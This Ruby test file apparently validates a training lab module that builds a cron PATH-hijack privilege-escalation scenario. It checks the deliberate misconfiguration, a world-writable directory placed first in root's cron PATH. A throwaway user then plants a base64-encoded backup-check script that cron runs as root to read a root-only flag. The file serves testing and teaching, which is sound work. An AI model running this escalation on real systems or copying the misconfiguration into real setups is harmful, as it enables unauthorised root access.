require_relative '../../../../../lib/post_provision_test'
require 'shellwords'

class CronPathHijackTest < PostProvisionTest
  # Account with no special rights, standing in for the student.
  LOW_PRIV_USER = 'nobody'
  CRON_FILE = '/etc/cron.d/cron_path_hijack'
  WRITABLE_DIR = '/usr/local/cron-bin'

  def initialize
    self.module_name = 'cron_path_hijack'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super

    # Inputs: leaked_filenames and strings_to_leak are both checked below. The
    # module has no other read_facts.
    filenames = (json_inputs['leaked_filenames'] || []).map(&:to_s).reject(&:empty?)
    strings   = json_inputs['strings_to_leak'] || []

    tier(1) do
      test_local_command('writable directory is first in the cron PATH', "grep '^PATH=' #{CRON_FILE}", "PATH=#{WRITABLE_DIR}:")
      test_local_command('root runs the job by bare name', "grep -v '^PATH=' #{CRON_FILE}", '* * * * * root backup-check')
      test_local_command('real script lives later in PATH', 'stat -c "%a %U" /usr/local/sbin/backup-check', '755 root')
      test_local_command('writable directory is world-writable', "stat -c '%a' #{WRITABLE_DIR}", '777')

      # leak_files pairs strings with filenames; extra strings go in the first file.
      strings.each_with_index do |str, i|
        file = filenames[i] || filenames.first
        next unless file
        path = Shellwords.escape("/root/#{file}")
        test_local_command("#{file} root-only in /root", "stat -c '%U:%G %a' #{path}", 'root:root 600')
        test_local_command("leaked string #{i + 1} is in /root/#{file}", "cat #{path}", str.to_s.strip.lines.first.to_s.strip)
      end
    end

    tier(2) do
      # The misconfiguration as a student sees it: read the crontab and write into the first PATH entry.
      test_local_command('unprivileged user can read the crontab', "cat #{CRON_FILE}", "PATH=#{WRITABLE_DIR}:", user: LOW_PRIV_USER)
      test_command_succeeds('unprivileged user can create files in the PATH directory',
                            "f=#{WRITABLE_DIR}/.secgen_probe_$$; : > $f && rm -f $f", user: LOW_PRIV_USER)
      # The flag is not readable without escalating.
      filenames.each do |f|
        test_command_succeeds("unprivileged user cannot read /root/#{f}",
                              "! cat #{Shellwords.escape("/root/#{f}")} 2>/dev/null", user: LOW_PRIV_USER)
      end
      # Cron is running and loaded the job: the legitimate script logs each run.
      found = false
      8.times do
        if run_command('test -s /var/log/backup-check.log && echo ran')[:stdout].include?('ran')
          found = true
          break
        end
        sleep 20
      end
      if found
        pass_check('cron runs the job from cron.d', 'backup-check ran under cron')
      else
        fail_check('cron runs the job from cron.d', '/var/log/backup-check.log empty after 160s',
                   evidence: run_command("systemctl is-active cron; cat #{CRON_FILE}; journalctl -u cron -n 20 --no-pager 2>&1")[:stdout])
      end
    end

    tier(3) do
      # Cron PATH hijack (T1574.007, path interception by PATH-environment
      # variable). A disposable unprivileged account plants an executable named
      # backup-check in the world-writable directory that sits first in root's
      # cron PATH; cron runs it as root in place of /usr/local/sbin/backup-check.
      # Proof is a sentinel the planted job writes as root (its `id` shows uid=0)
      # which also cats the root-only flag file, read back over the target's own
      # guest agent. record_rce_outcome asserts <privilege>=root_rwx from the
      # sentinel's id/groups. The planted file and sentinel are removed afterwards.
      flag_str  = strings.first.to_s.strip.lines.first.to_s.strip
      flag_file = filenames.first
      collect   = flag_file ? "cat #{Shellwords.escape("/root/#{flag_file}")}" : nil
      sentinel, scmd = build_sentinel(collect, dir: '/tmp')
      planted = "#{WRITABLE_DIR}/backup-check"
      # Hand the script to the plant command base64-encoded so no shell quoting
      # survives the runuser round-trip.
      payload = Base64.strict_encode64("#!/bin/sh\n#{scmd}\n")
      plant = "umask 022; echo #{payload} | base64 -d > #{Shellwords.escape(planted)} " \
              "&& chmod 0755 #{Shellwords.escape(planted)}"

      begin
        with_throwaway_ssh_user do |user, _pass|
          r = run_as_user(user, plant)
          if r[:exit_status] != 0
            fail_check('cron PATH hijack', "throwaway user #{user} could not plant #{planted}", tier: 3,
                       evidence: "$ #{plant}\n--- stderr\n#{r[:stderr]}")
          else
            # Cron fires every minute; allow up to a couple of ticks plus run time.
            body = wait_for_sentinel(sentinel, 150)
            record_rce_outcome('cron PATH hijack privilege escalation', body, sentinel,
                               "cron ran the planted backup-check as root (PATH hijack by throwaway user #{user})",
                               'root_rwx', 3)
            if sentinel_pwned?(body) && !flag_str.empty?
              if body.include?(flag_str)
                pass_check('root-only flag read via cron hijack',
                           "the planted root job read /root/#{flag_file}", tier: 3)
              else
                fail_check('root-only flag read via cron hijack',
                           "root ran the job but /root/#{flag_file} content was not captured", tier: 3,
                           evidence: "sentinel body:\n#{body}")
              end
            end
          end
        end
      ensure
        run_command("rm -f #{Shellwords.escape(planted)} #{Shellwords.escape(sentinel)}")
      end
    end
  end
end

CronPathHijackTest.new.run
